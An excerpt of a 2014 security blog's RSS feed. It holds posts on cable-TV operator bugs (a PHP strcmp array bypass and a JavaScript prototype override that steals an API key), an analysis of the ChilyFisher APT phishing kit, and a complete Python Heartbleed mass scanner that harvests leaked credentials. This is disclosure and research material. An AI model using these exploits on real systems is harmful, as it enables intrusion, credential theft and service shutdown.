#DD0000">"Logged&nbsp;IN&nbsp;!"</span><span style="color: #007700">;<br />}&nbsp;else&nbsp;{<br />print&nbsp;</span><span style="color: #DD0000">"wrong&nbsp;API!"</span><span style="color: #007700">;<br />}<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></code></div>
</div><u><b>Old bug PHP &lt; 5.3.* : Passing an array will bypass the check. <br />
</b></u><br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=727&amp;d=1407276485" border="0" alt="Name:  Screen Shot 2014-08-06 at 3.27.39 am.jpg
Views: 18966
Size:  11.9 KB"  style="float: CONFIG" /><br />
<br />
Php version older than 5.3 strcmp() implementation does not do a strict type checking. And if the input to strcmp function is an array then it returns a Null + warning. So simply enter an array instead of Access-key string.   localhost/program.php?key=hacked[] and were able to bypass the key check. Now with this bug any local operator would be able to hijack any other operators STB s with out having a valid access key. <br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=728&amp;d=1407277080" border="0" alt="Name:  Screen Shot 2014-08-06 at 3.37.17 am.jpg
Views: 19488
Size:  20.3 KB"  style="float: CONFIG" /><br />
<br />
<u><b>Bug 3: Cable TV Remote shutdown: CSRF bypass. <br />
</b></u><br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=729&amp;d=1407278962" border="0" alt="Name:  Screen Shot 2014-08-06 at 4.08.36 am.jpg
Views: 20438
Size:  16.1 KB"  style="float: CONFIG" /><br />
<br />
Cable TV Operators control Clients via unique key [Chip ID] as seen in the screenshot.<br />
This is accomplished via API Keys specific to the logged in admin.The implementation was flawed. <br />
The bug allowed a remote cable operator visiting a malicious webpage to remotely shutdown all Digital Tv instances.<br />
<br />
<u><b>API Key Implementation<br />
</b></u><br />
<br />
<u>They had a super secret JS file, which gets dynamically loaded for a given admin.<br />
</u><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:48px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #007700">&lt;</span><span style="color: #0000BB">script&nbsp;src</span><span style="color: #007700">=</span><span style="color: #0000BB">“load_secrets</span><span style="color: #007700">.</span><span style="color: #0000BB">js”</span><span style="color: #007700">&gt;</span><span style="color: #0000BB">&lt;/script&gt;<br /></span>They&nbsp;had&nbsp;some&nbsp;pretty&nbsp;cool&nbsp;anti-stealing&nbsp;code&nbsp;as&nbsp;well.&nbsp;<br /></span>
</code></code></div>
</div><div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:168px;">function checkUrl()
{
  var url = get_current_url();
  return url.match(url+'$') == 'flappybirds.com';
}
if(checkUrl())
{
  var api_key = &quot;77d11aea20ff61c6d1e23f044&quot;;alert(api_key);
  populateFormFields(super_secret); // Injects this token into the hidden input fields
} else{
  alert('Bad Domain !');
}</pre>
</div><u><b>The Bypass:<br />
</b></u><br />
<br />
Attacker can load,  &lt;script src=“load_secrets.js”&gt;&lt;/script&gt;<br />
But, checkAdmin() returns false and the attack would not work.But attacker can bypass this using,<br />
<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:120px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">//&nbsp;From&nbsp;attacker.com<br /></span><span style="color: #007700">&lt;</span><span style="color: #0000BB">script</span><span style="color: #007700">&gt;<br /></span><span style="color: #0000BB">String</span><span style="color: #007700">.</span><span style="color: #0000BB">prototype</span><span style="color: #007700">.</span><span style="color: #0000BB">match&nbsp;</span><span style="color: #007700">=&nbsp;function()<br />{<br />&nbsp;&nbsp;return&nbsp;&#91;</span><span style="color: #DD0000">"flappybirds.com"</span><span style="color: #007700">&#93;;<br />}<br /></span><span style="color: #0000BB">&lt;/script&gt;<br /></span>&lt;script&nbsp;src=“http://cable-tv.com/api_keys/load_secrets.js”&gt;&lt;/script&gt;&nbsp;<br /></span>
</code></code></div>
</div>You should check out ahamed nafeez's slides from HITB to learn more cool similar js bugs.<br />
<a href="http://haxpo.nl/wp-content/uploads/2014/02/D2T3-Using-Javascript-Security-Features-to-Kill-Itself.pdf" target="_blank">http://haxpo.nl/wp-content/uploads/2...ill-Itself.pdf</a><br />
<br />
We can host this code cross domain and make &quot;String.prototype.match&quot; , javascript .match() function to always return the value we specify . Any way if a local cable TV operator visits our page then we could now steal his API code hidden in the JS and then could use that to shut down all users in his locality . Remember the shutdown button I mentioned about in the previous bug. We used that shutdown feature to create a working POC. Check out the demo. Now any users cable access could be remotely shut down by an attacker. <br />

<iframe class="restrain" title="YouTube video player" width="640" height="390" src="//www.youtube.com/embed/LGiF46Ycg4k?wmode=opaque" frameborder="0"></iframe>
<br />
<br />
Imagine some attackers doing this shutdown hack at the time of World Cup, that would result in pandemonium. Any way these many low hanging bugs were enough to convince the CTO to give us the project.  And woot woot we were given access to their infrastructure :) and a small garage to work . I would write about more bugs in the coming days . Just keep yourself updated via my twitter page <a href="http://twitter.com/fb1h2s" target="_blank">http://twitter.com/fb1h2s</a> or Grage fb page <a href="https://www.facebook.com/Garage4Hackers" target="_blank">https://www.facebook.com/Garage4Hackers</a> .<br />
<br />
Regards. <br />
Rahul Sasi<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=730&amp;d=1407279789" border="0" alt="Name:  combine_images5.jpg
Views: 8928
Size:  95.8 KB"  style="float: CONFIG" /></blockquote>

]]></content:encoded>
			<dc:creator>fb1h2s</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3073</guid>
		</item>
		<item>
			<title>How the Internet Bug bounty Killed an Exploit Kit.</title>
			<link>http://garage4hackers.com/entry.php?b=3069</link>
			<pubDate>Thu, 17 Jul 2014 23:32:57 GMT</pubDate>
			<description><![CDATA[Attachment 755 (http://garage4hackers.com/attachment.php?attachmentid=755) 
It is been 4 years since the Internet [Web] bug bounty programs kicked...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><img src="http://garage4hackers.com/attachment.php?attachmentid=755&amp;d=1408562987" border="0" alt="Name:  BUGCROWD.jpg
Views: 4005
Size:  10.5 KB"  style="float: CONFIG" /><br />
It is been 4 years since the Internet [Web] bug bounty programs kicked in. It would be great to see what changes it has brought to the Security community. From what I understood is the most no of reported bugs to bug-bounty programs are XSS . Yes Cross Site scripting. We are writing about an Infamous Phishing/Exploit kit named Chillyfisher that was used by few APT groups that utilized xss and phishing emails to hack their targets.  <br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=713&amp;d=1405642458" border="0" alt="Name:  exploit-kits.jpg
Views: 6122
Size:  49.3 KB"  style="float: CONFIG" /><br />
<br />
<u><b>ChilyFisher Exploit Kit: <br />
</b></u><br />
<br />
ChilyFisher was a Phishing+Exploit+XSS exploit framework used by multiple APT groups including the infamous &quot;<a href="https://www.google.com/webhp?#q=NETTRAVELER" target="_blank">NETTRAVELER</a>&quot; group mainly in 2008-2013.  The name chillyfisher is given based on the string present in the kit &quot;Copyright 2008 ChilyFisher, Allright Reserved&quot; . One of the interesting features of this kit was the ability to hack multiple Web Mails including [Yahoo, Aol,mail.ru,rediffmail, sina, ] etc . The kit used XSS vulnerabilities and phishing pages to hack email conversations. Back in 2010 it was pretty easy to find an XSS in the above mentioned targets. But with the rise in the many bug bounty programs the many similar exploit kits died. For example the bug bountys managed by <a href="https://hackerone.com/" target="_blank">hackerone</a> for yahoo and mail.ru where among the targeted webmails for this APT team. <br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=711&amp;d=1405640056" border="0" alt="Name:  001.jpg
Views: 2400
Size:  18.7 KB"  style="float: CONFIG" /><br />
<br />
Though there is no public information available about this kit, it was widely known among the security community. This blog would give an overview of this exploit kit , how it was used and attribution.<br />
<br />
<br />
<u><b>Front End code:<br />
</b></u><br />
The kit had a frontend and Backend code . The function of the Front end code was to send mass phishing/exploit emails to targets. The front end code allowed attackers to mass include target emails, subject and email content. The phishing email sent has a hyperlink with unique callback to the backend code. Now when victims open their email , the XSS would be triggered and the cookies would be logged to backend server or will fall back to secondary attack &quot;phishing&quot;. The kit contained a phishing and browser exploit module . Also have seen multiple java exploits on chillyfisher hosted servers . Chillyfishes had phishing modules for almost all popular webmails . The following are the list of websites the kit had phishing modules for.<br />
<br />
<u><b>Chillyfisher Phishing modules and supported sites: <br />
</b></u> <br />
<img src="https://fbcdn-sphotos-b-a.akamaihd.net/hphotos-ak-xpa1/t31.0-8/10498722_10152772693297454_2139600879296127204_o.jpg" border="0" alt="" /><br />
<br />
The following screenshot provides info on the database that keeps the Phishing/Exploit emails , Targets, Recipient, Email Subject .<br />
<br />
<u><b>Targets emails, Email subject , Send as email:<br />
</b></u><br />
<a href="https://scontent-b-cdg.xx.fbcdn.net/hphotos-xpa1/t31.0-8/p417x417/10496955_10152772672482454_1097594701188212733_o.jpg" target="_blank">Zoom Image:<br />
</a><img src="https://scontent-b-cdg.xx.fbcdn.net/hphotos-xpa1/t31.0-8/p417x417/10496955_10152772672482454_1097594701188212733_o.jpg" border="0" alt="" /><br />
<br />
<u><b>Back End code:<br />
</b></u><br />
All the collected information is managed by a backend web application made in asp.From the admin interface attackers could view all the collected information of the victims . For example the following screenshot shows Chillyfisher login page.<br />
<br />
<u><b>Exploit kit Admin Login :<br />
</b></u><br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=702&amp;d=1405638404" border="0" alt="Name:  Screen Shot 2014-06-08 at 5.23.24 pm.jpg
Views: 2315
Size:  19.0 KB"  style="float: CONFIG" /><br />
The backend database used is MS-Access . All collected information is stored in this database.<br />
<br />
<u><b>DB Structure <br />
</b></u><br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=703&amp;d=1405638427" border="0" alt="Name:  Screen Shot 2014-07-18 at 1.47.53 am.jpg
Views: 2326
Size:  21.4 KB"  style="float: CONFIG" /><br />
<br />
In the above screenshot we could see the DB structure of a Chillyfisher instance and &quot;Loginlog&quot; table having informations about ChillyFisher admins who logged into the control panel. &quot;Too bad feature for an exploit kit I suppose  :p &quot; . Btw all the admin logins were from China , so that should give a fair idea  where the attackers are from. The log informations are also emailed to a user at <a href="mailto:v.nestelrooy@gmail.com">v.nestelrooy@gmail.com</a> .<br />
<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=704&amp;d=1405638447" border="0" alt="Name:  Screen Shot 2014-07-18 at 2.15.46 am.png
Views: 2280
Size:  19.3 KB"  style="float: CONFIG" /><br />
The following screenshot is that of the landing page after authentication.<br />
<br />
<b><u>Chillyfisher Control Panel <br />
</u></b><br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=705&amp;d=1405638483" border="0" alt="Name:  Screen Shot 2014-06-08 at 5.27.45 pm.jpg
Views: 2389
Size:  20.0 KB"  style="float: CONFIG" /><br />
<br />
<u><b>Logged in users would be able to view collected cookies, password, and other informations related to victims.  <br />
</b></u><br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=706&amp;d=1405638713" border="0" alt="Name:  Screen Shot 2014-07-18 at 3.10.55 am.jpg
Views: 2342
Size:  19.4 KB"  style="float: CONFIG" /><br />
<br />
<br />
<u><b>Infections and Attributions :<br />
</b></u><br />
I have collected about 10,000 unique IP address from multiple chillyfisher exploit kits we identified in the wild. And have created a geo map out of it. The most no of the targets were from China followed by USA. <br />
<br />
<u><b>IP address that logged into Control panel . <br />
</b></u><br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=707&amp;d=1405638793" border="0" alt="Name:  Screen Shot 2014-07-16 at 1.52.28 pm.jpg
Views: 2308
Size:  15.0 KB"  style="float: CONFIG" /><br />
<br />
Since this kit was mainly used to monitor activist[emails] rather than corporate espionage , the most hits were from China. The second map would provide better understanding of the numbers of targets based on City.<br />
<br />
<u>A better quality Map is over here:<br />
</u><br />
<a href="http://postimg.org/image/gbeyf7wql/" target="_blank">http://postimg.org/image/gbeyf7wql/</a><br />
<br />
<a href="https://fbcdn-sphotos-h-a.akamaihd.net/hphotos-ak-xpa1/t31.0-8/10515241_10152769016957454_4021271339856623144_o.jpg" target="_blank">https://fbcdn-sphotos-h-a.akamaihd.n...56623144_o.jpg</a><br />
<br />
Chinese regions were most targeted. Since nettravler was previously <a href="http://securelist.com/blog/research/35936/nettraveler-is-running-red-star-apt-attacks-compromise-high-profile-victims/" target="_blank">attributed</a> we an either assume the attckers are in China or is using China as a proxy  . <br />
<br />
<u><b>Screenshot of Infections in Asia Pacific regions:<br />
</b></u><br />
<img src="https://fbcdn-sphotos-c-a.akamaihd.net/hphotos-ak-xpa1/t1.0-9/p417x417/10563125_10152769022747454_1194210632272228039_n.jpg" border="0" alt="" /><br />
<br />
<u><b>Screen Shot of Infections in N|S America , Middle East and Europe :<br />
</b></u><br />
<br />
<img src="https://fbcdn-sphotos-e-a.akamaihd.net/hphotos-ak-xaf1/t1.0-9/10523910_10152769022742454_7011538813350364314_n.jpg" border="0" alt="" /><br />
<br />
<u>Btw these awsome Maps were build using <a href="http://twitter.com/5pld3y" target="_blank">http://twitter.com/5pld3y</a> ipt2map code <a href="https://github.com/5pld3y/ip2map" target="_blank">https://github.com/5pld3y/ip2map</a> .</u><br />
<br />
The kit seems like not being used anymore , since it is hard to find an XSS in yahoo or mail.ru or any other mail clients. But the phishing modules will work. <br />
<br />
The moral of the post would be to not underestimate when someone finds an XSS bugs and how XSS was used by APT groups for surveillance. How efficient bugbounty programs are making the internet a lot more safe. <br />
<br />
<br />
If you need more information on the kit Contact me over email at fb1h2s[@]gmail.com.<br />
<br />
Regards.<br />
Rahul Sasi,<br />
<a href="https://twitter.com/fb1h2s" target="_blank">https://twitter.com/fb1h2s</a></blockquote>


<!-- attachments -->
	<div class="blogattachments">
		
		
			<fieldset class="blogcontent">
				<legend>Attached Images</legend>
				
			</fieldset>
		
		
		

	</div>
<!-- / attachments -->
]]></content:encoded>
			<dc:creator>fb1h2s</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3069</guid>
		</item>
		<item>
			<title>Hacking Your Cable TV Networks : HITB Security Conference Part 0.</title>
			<link>http://garage4hackers.com/entry.php?b=2830</link>
			<pubDate>Thu, 22 May 2014 09:59:00 GMT</pubDate>
			<description>Attachment 689 (http://garage4hackers.com/attachment.php?attachmentid=689) 
I would be presenting at HITB Amsterdam this 29th - 30th on Digital Cable...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><img src="http://garage4hackers.com/attachment.php?attachmentid=689&amp;d=1400751062" border="0" alt="Name:  300-200-hitb2014ams-01.jpg
Views: 8529
Size:  68.7 KB"  style="float: CONFIG" /><br />
I would be presenting at HITB Amsterdam this 29th - 30th on Digital Cable TV security . I am from an application security computer science background and the talk is all about appsec in Digital Cable TV implementations. But certain digital signal concepts were bit hard for me to remember. So in this pre-con blogpost I would add few short notes on few terms I would be referring to in my talk . <br />
<br />
Television is one way medium unlike internet , so if someone hacks into your Cable TV networks and stream in a Video stating that a riot has started in the nearby village/city, that can cause enough panic. In our talk we will explain both analog and digital cable networks. We were working with a Cable TV provider of our state for the past 8 months and in the talk we would cover the various , insecure designs, bugs and practical exploits we found on Cable TV networks. This would be a treat for application security enthusiast. <br />
<br />
Here is a Video Demonstrating Analog attacks on Tv networks using MITM . Analog networks are obsolete , but this would help to understand . Also MITB atatck would be possible in implementation of certain Digital Standards as well.<br />
<br />
The following topics would be explained in the talk: <br />
Analogue Cable TV <br />
DVB-C <br />
IPTV<br />
<br />
<u><b>To see a preview of what we are gone present check out this video:<br />
</b></u><br />
<a href="https://www.facebook.com/photo.php?v=739012102783885" target="_blank">https://www.facebook.com/photo.php?v=739012102783885<br />
</a><br />
<br />

<iframe class="restrain" title="YouTube video player" width="640" height="390" src="//www.youtube.com/embed/qr_2utkW4E4?wmode=opaque" frameborder="0"></iframe>
<br />
<a href="https://www.facebook.com/photo.php?v=739012102783885" target="_blank">https://www.facebook.com/photo.php?v=739012102783885<br />
</a><br />
<br />
<br />
In the above MITM attack we used a signal cutter to chop down the main channel [ ndtv frequency ] and then modulate our video in the frequency of NDTV [A man-in-middle in our test environment] . This would work well in the case of analog networks but when it comes to Digital networks this would not happen . This is mainly because DVB-C is an encrypted stream and an easy MITM would not be possible. But we would reveal the many possible real world attacks on this .  Stay tuned for IPTV and DVB-C attacks from our talk. <br />
<br />
Introduction to Analog and Digital Cable TV networks:<br />
<br />
Terms to Remember:<br />
IRD<br />
An integrated receiver/decoder (IRD) is an electronic device used to pick up a radio-frequency signal and convert digital information transmitted in it.<br />
<a href="http://en.wikipedia.org/wiki/Integrated_receiver/decoder" target="_blank">http://en.wikipedia.org/wiki/Integra...ceiver/decoder</a><br />
<br />
QAM:<br />
Quadrature amplitude modulation (QAM) is both an analog and a digital modulation scheme. It conveys two analog message signals, or two digital bit streams, by changing (modulating) the amplitudes of two carrier waves, using the amplitude-shift keying (ASK) digital modulation scheme or amplitude modulation (AM) analog modulation scheme.<br />
<a href="http://en.wikipedia.org/wiki/Quadrature_amplitude_modulation" target="_blank">http://en.wikipedia.org/wiki/Quadrat...ude_modulation</a><br />
<br />
DVB Standards: <br />
<a href="http://en.wikipedia.org/wiki/Digital_Video_Broadcasting" target="_blank">http://en.wikipedia.org/wiki/Digital_Video_Broadcasting</a><br />
<br />
<b>Satellite</b>: DVB-S, DVB-S2 and DVB-SH DVB-SMATV for distribution via SMATV<br />
<b>Cable</b>: DVB-C, DVB-C2<br />
<b><b>Terrestrial television:</b></b> DVB-T, DVB-T2<br />
Digital terrestrial television for handhelds: DVB-H, DVB-SH<br />
<br />
Source coding and MPEG-2 multiplexing (MUX):<br />
<br />
DVB-C Conditional_access:<br />
These standards define a method by which one can obfuscate a digital-television stream, with access provided only to those with valid decryption smart-cards.</blockquote>


<!-- attachments -->
	<div class="blogattachments">
		
		
			<fieldset class="blogcontent">
				<legend>Attached Images</legend>
				
			</fieldset>
		
		
		

	</div>
<!-- / attachments -->
]]></content:encoded>
			<dc:creator>fb1h2s</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=2830</guid>
		</item>
		<item>
			<title>CVE-2014-0160 Heartbleed Attack POC and Mass Scanner .</title>
			<link>http://garage4hackers.com/entry.php?b=2551</link>
			<pubDate>Tue, 08 Apr 2014 23:18:39 GMT</pubDate>
			<description>TLS Heart Bleed Attack. 
 
This is one of the most scary bugs I have seen in the last few years. A lot of discussion is going on and there are quite...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">TLS Heart Bleed Attack.<br />
<br />
This is one of the most scary bugs I have seen in the last few years. A lot of discussion is going on and there are quite a number of blogs regarding this. But I couldn't find anything that explicitly talks about the vulnerability and exploitation methods. Also many organizations have multiple https servers using openssl. So I have created this mas auditing tool that could scan them all in one click.<br />
<br />
<a href="https://bitbucket.org/fb1h2s/cve-2014-0160" target="_blank">https://bitbucket.org/fb1h2s/cve-2014-0160</a><br />
<br />
<u><b>Scan:<br />
</b></u><br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=676&amp;d=1397000215" border="0" alt="Name:  Screen Shot 2014-04-09 at 5.04.49 am.jpg
Views: 20117
Size:  19.9 KB"  style="float: CONFIG" /><br />
<br />
<br />
TLS HearBeat Extension.<br />
<br />
The vulnerability lies in the implementation of TLS Heartbeat extension. There is common necessity <br />
in an established ssl session to maintain the connection for a longer time.  The HeartBeat protocol extension is added to TLS for this reason. The HTTP keep-alive feature does the same but HB protocol allows a client to perform this action in much higher rate. <br />
<br />
The client can send a Heart-Beat request message and the server has to respond back with a HearBeat response .<br />
<a href="https://tools.ietf.org/html/rfc6520#page-2" target="_blank">https://tools.ietf.org/html/rfc6520#page-2</a><br />
<br />
So in short the Heartbeat Protocol is simple and has a request and response module. <br />
<br />
heartbeat_request(1),<br />
heartbeat_response(2),<br />
<br />
<u>The following is the structure of a HB protocol. <br />
</u><br />
The following is heartbeat protocol .<br />
<br />
  <div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:96px;"> struct {
      HeartbeatMessageType type;
      uint16 payload_length;
      opaque payload[HeartbeatMessage.payload_length];
      opaque padding[padding_length];
   } HeartbeatMessage;</pre>
</div>Here the Message Type is 1 byte, payload_length is 2 byte and necessary padding based on payload .<br />
<br />
So the entire heartbeat protocol is an addon for openssl . This following is the structure for a TLS packet with HB addon.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">const unsigned char good_data_2[] = {
    // TLS record
    0x16, // Content Type: Handshake
    0x03, 0x01, // Version: TLS 1.0
    0x00, 0x6c, // Length (use for bounds checking)
        // Handshake
        0x01, // Handshake Type: Client Hello
        0x00, 0x00, 0x68, // Length (use for bounds checking)
        0x03, 0x03, // Version: TLS 1.2
        // Random (32 bytes fixed length)
        0xb6, 0xb2, 0x6a, 0xfb, 0x55, 0x5e, 0x03, 0xd5,
        0x65, 0xa3, 0x6a, 0xf0, 0x5e, 0xa5, 0x43, 0x02,
        0x93, 0xb9, 0x59, 0xa7, 0x54, 0xc3, 0xdd, 0x78,
        0x57, 0x58, 0x34, 0xc5, 0x82, 0xfd, 0x53, 0xd1,
        0x00, // Session ID Length (skip past this much)
        0x00, 0x04, // Cipher Suites Length (skip past this much)
            0x00, 0x01, // NULL-MD5
            0x00, 0xff, // RENEGOTIATION INFO SCSV
        0x01, // Compression Methods Length (skip past this much)
            0x00, // NULL
        0x00, 0x3b, // Extensions Length (use for bounds checking)
            // Extension
            0x00, 0x00, // Extension Type: Server Name (check extension type)
            0x00, 0x0e, // Length (use for bounds checking)
            0x00, 0x0c, // Server Name Indication Length
                0x00, // Server Name Type: host_name (check server name type)
                0x00, 0x09, // Length (length of your data)
                // &quot;localhost&quot; (data your after)
                0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74,
            // Extension
            0x00, 0x0d, // Extension Type: Signature Algorithms (check extension type)
            0x00, 0x20, // Length (skip past since this is the wrong extension)
            // Data
            0x00, 0x1e, 0x06, 0x01, 0x06, 0x02, 0x06, 0x03,
            0x05, 0x01, 0x05, 0x02, 0x05, 0x03, 0x04, 0x01,
            0x04, 0x02, 0x04, 0x03, 0x03, 0x01, 0x03, 0x02,
            0x03, 0x03, 0x02, 0x01, 0x02, 0x02, 0x02, 0x03,
            // Extension
            0x00, 0x0f, <b><u>// Extension Type: Heart Beat (check extension type)</u></b>
            0x00, 0x01, // Length (skip past since this is the wrong extension)
            0x01 // Mode: Peer allows to send requests
};</pre>
</div><br />
The bugg code was an insecure malloc <a href="https://github.com/openssl/openssl/commit/96db9023b881d7cd9f379b0c154650d6c108e9a3#diff-2" target="_blank">https://github.com/openssl/openssl/c...108e9a3#diff-2</a><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:48px;">
buffer = OPENSSL_malloc(1 + 2 + payload + padding);</pre>
</div>In the above code memory is allocated from the payload + padding which is a user controlled value.  There was no length check for this particular allocation and an attacker could force the Openssl server to read arbitrary memory locations.<br />
<br />
<br />
<br />
The total length of a HeartbeatMessage does NOT exceed 2^14 or max_fragment_length when negotiated as defined in [RFC6066]. Here we are only able to leak 64 kb of memory and that could easily have usernames/password etc. Even though openssllib has loaded the server secret keys somewhere in memory it very unlikely to access that using this bug due the the heap allocations.  <br />
<br />
Constant HB request could be made to the server leaking (random memory) any amount of data from the server .<br />
<br />
The fix to this bug was to simply bound check the payload + padding length to not exceed 16 bytes .<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:60px;">unsigned int write_length = 1 /* heartbeat type */ +
 +					    2 /* heartbeat length */ +
 +					    payload + padding;</pre>
</div><br />
As well as to not allow the HB length to exceed the max length.<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:96px;">unsigned int write_length = 1 /* heartbeat type */ +
 +					    2 /* heartbeat length */ +
 +					    payload + padding;
  
 +		if (write_length &gt; SSL3_RT_MAX_PLAIN_LENGTH)
 +			return 0;</pre>
</div><br />
Exploitation:<br />
<br />
I have created a Mass Auditing tool. So that you can give in a huge range of targets as a list and the tool would find important informations for you.  Give it a list of targets and it would detect the vulnerability and list out if any username password is found. <br />
<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">import socket, ssl, pprint
import Queue
import threading,time,sys,select,struct,urllib,time,re,os


'''

    16 03 02 00 31 # TLS Header
    01 00 00 2d # Handshake header
    03 02 # ClientHello field: version number (TLS 1.1)
    50 0b af bb b7 5a b8 3e f0 ab 9a e3 f3 9c 63 15 \
    33 41 37 ac fd 6c 18 1a 24 60 dc 49 67 c2 fd 96 # ClientHello field: random
    00 # ClientHello field: session id
    00 04 # ClientHello field: cipher suite length
    00 33 c0 11 # ClientHello field: cipher suite(s)
    01 # ClientHello field: compression support, length
    00 # ClientHello field: compression support, no compression (0)
    00 00 # ClientHello field: extension length (0)

'''



hello_packet = &quot;16030200310100002d0302500bafbbb75ab83ef0ab9ae3f39c6315334137acfd6c181a2460dc4967c2fd960000040033c01101000000&quot;.decode('hex')
hb_packet = &quot;1803020003014000&quot;.decode('hex')

def password_parse(the_response):
    the_response_nl= the_response.split(' ')
    #Interesting Paramaters found:
    for each_item in the_response_nl:
        if &quot;=&quot; in each_item or &quot;password&quot; in each_item:
            print each_item


def recv_timeout(the_socket,timeout=2):
    #make socket non blocking
    the_socket.setblocking(0)

    #total data partwise in an array
    total_data=[];
    data='';

    #beginning time
    begin=time.time()
    while 1:
        if total_data and time.time()-begin &gt; timeout:
            break

        elif time.time()-begin &gt; timeout*2:
            break

        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data)
                #change the beginning time for measurement
                begin=time.time()
            else:
                #sleep for sometime to indicate a gap
                time.sleep(0.1)
        except:
            pass

    return ''.join(total_data)


def tls(target_addr):

    try:

        server_port =443
        target_addr = target_addr.strip()

        if &quot;:&quot; in target_addr:
            server_port = target_addr.split(&quot;:&quot;)[1]
            target_addr = target_addr.split(&quot;:&quot;)[0]

        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sys.stdout.flush()
        print &gt;&gt;sys.stderr, '\n[+]Scanning  server %s' % target_addr , &quot;\n&quot;
        print &quot;##############################################################&quot;
        sys.stdout.flush()
        client_socket .connect((target_addr, int(server_port)))
        #'Sending Hello request...'
        client_socket.send(hello_packet)
        recv_timeout(client_socket,3)
        print 'Sending heartbeat request...'
        client_socket.send(hb_packet)
        data = recv_timeout(client_socket,3)
        if len(data) &gt; 7 :
            print &quot;[-] &quot;,target_addr,' Vulnerable Server ...\n'
            #print data
            if os.path.exists(target_addr+&quot;.txt&quot;):
                file_write = open(target_addr+&quot;.txt&quot;, 'a+')
            else:
                file_write = file(target_addr+&quot;.txt&quot;, &quot;w&quot;)
            file_write.write(data)
        else :
            print &quot;[-] &quot;,target_addr,' Not Vulnerable  ...'
    except Exception as e:
        print e,target_addr,server_port



class BinaryGrab(threading.Thread):
    &quot;&quot;&quot;Threaded Url Grab&quot;&quot;&quot;
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            url = self.queue.get()
            tls(url)
            #Scan targets here

            #signals to queue job is done
            self.queue.task_done()



start = time.time()

def manyurls(server_addr):
    querange = len(server_addr)
    queue = Queue.Queue()

    #spawn a pool of threads, and pass them queue instance
    for i in range(int(querange)):
        t = BinaryGrab(queue)
        t.setDaemon(True)
        t.start()

    #populate queue with data
    for target in server_addr:

        queue.put(target)

    #wait on the queue until everything has been processed
    queue.join()
if __name__ == &quot;__main__&quot;:
    # Kepp all ur targets in scan.txt in the same folder.
    server_addr = []
    read_f = open(&quot;scan.txt&quot;, &quot;r&quot;)
    server_addr = read_f.readlines()
    #or provide names here
    #server_addr = ['yahoo.com']
    manyurls(server_addr)</pre>
</div><br />
<br />
<br />
Leaked UserName password Cookie files would be  stored in the local folder with target name.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=677&amp;d=1397000343" border="0" alt="Name:  Screen Shot 2014-04-09 at 5.08.06 am.jpg
Views: 19143
Size:  15.7 KB"  style="float: CONFIG" /><br />
<br />
<br />
Regards.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=675&amp;d=1396999210" border="0" alt="Name:  heartbleed.png
Views: 19197
Size:  7.1 KB"  style="float: CONFIG" /><br />
Reference:<br />
<br />
<a href="http://blog.bjrn.se/2012/07/fun-with-tls-handshake.html" target="_blank">http://blog.bjrn.se/2012/07/fun-with-tls-handshake.html</a><br />
<a href="https://github.com/openssl/openssl/commit/96db9023b881d7cd9f379b0c154650d6c108e9a3#diff-2" target="_blank">https://github.com/openssl/openssl/c...108e9a3#diff-2</a><br />
<a href="https://bitbucket.org/fb1h2s/cve-2014-0160/src/2b1fff1a62e29397ff60586557c96989c7b64662/Heartbeat_scanner.py?at=master" target="_blank">https://bitbucket.org/fb1h2s/cve-201...r.py?at=master</a></blockquote>

]]></content:encoded>
			<dc:creator>fb1h2s</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=2551</guid>
		</item>
		<item>
			<title>Sandy:  Opensource  Exploit Analysis Framework .</title>
			<link>http://garage4hackers.com/entry.php?b=2532</link>
			<pubDate>Mon, 07 Apr 2014 07:17:00 GMT</pubDate>
			<description>Client side exploits are inevitable part of the security Industry. And no matter how much new security is added to these products they would be...</description>
